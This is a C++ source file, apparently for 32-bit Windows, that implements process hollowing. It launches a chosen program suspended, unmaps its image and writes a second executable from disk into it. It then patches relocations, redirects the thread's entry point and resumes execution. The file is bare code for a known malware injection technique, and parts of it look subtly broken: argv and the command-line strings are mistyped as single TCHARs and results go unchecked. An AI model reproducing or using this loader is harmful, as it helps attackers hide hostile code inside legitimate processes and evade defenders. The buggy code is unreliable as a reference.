#include "MainHollow.h"


int _tmain(int argc, TCHAR argv[]) {

	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	HANDLE ProcessId = NULL;
	TCHAR commandLine = argv[1];
	TCHAR filePath = argv[2];
	BOOL success = CreateProcess(NULL, &commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if (success) {
		_tprintf(_T("Process Id: %d\n"), pi.dwProcessId);
		ProcessId = pi.hProcess;
	}

	HMODULE hNTDLL = LoadLibraryA("ntdll");
	FARPROC fpNtQueryInformationProcess = GetProcAddress(
		hNTDLL,
		"NtQueryInformationProcess"
	);
	NtQueryInformationProcess QueryInformationProcess = (NtQueryInformationProcess)fpNtQueryInformationProcess;

	PROCESS_BASIC_INFORMATION pbi;
	DWORD returnLength = 0;
	QueryInformationProcess(ProcessId, 0, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	DWORD destImageBase = 0;
	DWORD bytesRead = 0;
	ReadProcessMemory(pi.hProcess, &pbi.PebBaseAddress->ImageBaseAddress, &destImageBase, 4, &bytesRead);
	printf("ImageBase: %d \n", destImageBase);
	FARPROC fpNtUnmapViewOfSection = GetProcAddress(
		hNTDLL,
		"NtUnmapViewOfSection"
	);
	NtUnmapViewOfSection UnmapViewOfSection = (NtUnmapViewOfSection)fpNtUnmapViewOfSection;
	UnmapViewOfSection(pi.hProcess, (PVOID)destImageBase);

	HANDLE hFile = CreateFile(&filePath, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	DWORD FileSize = GetFileSize(hFile, NULL);
	PVOID imageBuffer = LocalAlloc(LPTR, FileSize);
	DWORD bytesWriten = 0;
	success = ReadFile(hFile, imageBuffer, FileSize, &bytesRead, NULL);

	PIMAGE_DOS_HEADER DOSHeaders = (PIMAGE_DOS_HEADER)imageBuffer;
	PIMAGE_NT_HEADERS NTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)imageBuffer + DOSHeaders->e_lfanew);

	DWORD sourceImageBase = (DWORD)NTHeaders->OptionalHeader.ImageBase;
	PVOID imageMemAllocBaseAddress = VirtualAllocEx(pi.hProcess, (PVOID)destImageBase, NTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, (PVOID)destImageBase, imageBuffer, NTHeaders->OptionalHeader.SizeOfHeaders, &bytesWriten);

	PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)imageBuffer + DOSHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS));

	BYTE* reloc = (BYTE*)".reloc";
	DWORD relocSectionNumber = 0;

	for (int i = 0; i < NTHeaders->FileHeader.NumberOfSections; i++) {
		DWORD pointerToVirtualAddress = destImageBase + sectionHeader->VirtualAddress;
		DWORD pointerToRowData = (DWORD)imageBuffer + sectionHeader->PointerToRawData;
		DWORD sizeOfSectionData = sectionHeader->SizeOfRawData;
		WriteProcessMemory(pi.hProcess, (PVOID)pointerToVirtualAddress, (PVOID)pointerToRowData, sizeOfSectionData, &bytesWriten);
		if (memcmp(sectionHeader->Name, reloc, 5) == 0) {
			relocSectionNumber = i;
		}
		sectionHeader++;
	}

	sectionHeader -= NTHeaders->FileHeader.NumberOfSections;
	DWORD deltaBase = destImageBase - sourceImageBase;
	IMAGE_DATA_DIRECTORY relocDir = NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD pointerToRelocRowData = sectionHeader[relocSectionNumber].PointerToRawData;
	DWORD offsetValue = 0;
	while (offsetValue < relocDir.Size) {
		BASE_RELOCATION_BLOCK* relocBlock = (BASE_RELOCATION_BLOCK*)((DWORD)imageBuffer + pointerToRelocRowData + offsetValue);
		offsetValue += sizeof(BASE_RELOCATION_BLOCK);
		BASE_RELOCATION_ENTRY* relocEntry = (BASE_RELOCATION_ENTRY*)((DWORD)imageBuffer + pointerToRelocRowData + offsetValue);
		DWORD blockSize = relocBlock->BlockSize;
		DWORD numberOfEntries = (blockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		for (int i = 0; i < numberOfEntries; i++) {
			offsetValue += sizeof(BASE_RELOCATION_ENTRY);
			if (relocEntry[i].Type == 0) {
				continue;
			}
			DWORD DataLocation = destImageBase + relocBlock->PageAddress + relocEntry[i].Offset;
			DWORD PointerToDataLocation = 0;
			ReadProcessMemory(pi.hProcess, (PVOID)DataLocation, &PointerToDataLocation, sizeof(DWORD), &bytesRead);
			PointerToDataLocation += deltaBase;
			WriteProcessMemory(pi.hProcess, (PVOID)DataLocation, &PointerToDataLocation, sizeof(DWORD), &bytesWriten);
		}
			   
	}

	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pi.hThread, pContext);
	pContext->Eax = destImageBase + NTHeaders->OptionalHeader.AddressOfEntryPoint;
	SetThreadContext(pi.hThread, pContext);
	ResumeThread(pi.hThread);
	
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hFile);
}